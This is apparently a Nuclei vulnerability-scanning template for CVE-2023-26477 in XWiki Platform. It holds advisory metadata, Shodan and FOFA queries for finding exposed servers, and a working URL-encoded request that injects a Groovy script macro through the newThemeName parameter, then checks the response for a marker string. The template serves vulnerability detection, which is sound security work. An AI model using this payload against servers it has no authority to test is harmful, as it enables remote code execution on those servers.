id: CVE-2023-26477

info:
  name: XWiki Platform Wiki Syntax Injection via newThemeName
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    XWiki Platform is vulnerable to arbitrary wiki syntax injection including Groovy, Python, and Velocity script macros via the `newThemeName` request parameter. This allows execution of arbitrary code on the server.
  impact: |
    An attacker can inject malicious Wiki Syntax code, leading to potential code execution or data manipulation.
  remediation: |
    Apply the latest security patches provided by XWiki to mitigate the vulnerability.
  reference:
    - https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-x2qm-r4wx-8gpg
    - https://jira.xwiki.org/browse/XWIKI-19757
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/kitsec-labs/kitsec-core
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2023-26477
    cwe-id: CWE-94,CWE-95
    epss-score: 0.00586
    epss-percentile: 0.7883
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
  metadata:
    vendor: xwiki
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    fofa-query: body="data-xwiki-reference"
  tags: intrusive

http:
  - method: GET
    path:
      - "/xwiki/bin/view/FlamingoThemesCode/WebHomeSheet?newThemeName={{randstr}}%22%2F%7D%7D%7B%7Basync%20async%3D%22true%22%20cached%3D%22false%22%20context%3D%22doc.reference%22%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22hello%20from%20groovy!%22)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D&form_token=1&action=create"

    matchers:
      - type: word
        words:
          - "hello from groovy!"
        part: body
